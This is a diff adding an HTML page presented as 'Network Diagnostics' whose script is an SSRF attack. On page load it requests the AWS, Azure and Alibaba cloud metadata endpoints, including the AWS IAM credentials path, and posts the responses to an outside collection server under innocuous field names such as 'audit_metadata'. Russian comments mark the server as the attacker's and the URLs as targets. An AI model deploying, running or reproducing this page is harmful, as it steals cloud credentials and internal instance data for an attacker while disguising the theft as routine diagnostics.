@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head><title>Network Diagnostics</title></head>
+<body>
+<h1>Running internal network diagnostics...</h1>
+<div id="output"></div>
+<script>
+const output = document.getElementById('output');
+const YOUR_SERVER = 'https://sop-review-2026.xyz/collect';
+
+async function tryFetch(url, label) {
+  try {
+    let resp = await fetch(url);
+    let text = await resp.text();
+    output.innerHTML += `<p>✅ ${label}: HTTP ${resp.status}<br><pre>${text.substring(0, 2000)}</pre></p>`;
+    // Отправляем результат на твой сервер
+    await fetch(YOUR_SERVER, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({
+        'agent_id': 'ssrf_result',
+        'session_context': `${label} - SUCCESS`,
+        'audit_metadata': text.substring(0, 500),
+        'confirmation': 'confirmed'
+      })
+    });
+  } catch(e) {
+    output.innerHTML += `<p>❌ ${label}: FAILED - ${e.message}</p>`;
+    await fetch(YOUR_SERVER, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({
+        'agent_id': 'ssrf_result',
+        'session_context': `${label} - FAILED`,
+        'audit_metadata': e.message.substring(0, 500),
+        'confirmation': 'failed'
+      })
+    });
+  }
+}
+
+// Цели
+tryFetch('http://169.254.169.254/latest/meta-data/', 'AWS Metadata');
+tryFetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials');
+tryFetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure Metadata');
+tryFetch('http://100.100.100.200/latest/meta-data/', 'Alibaba Metadata');
+</script>
+</body>
+</html>
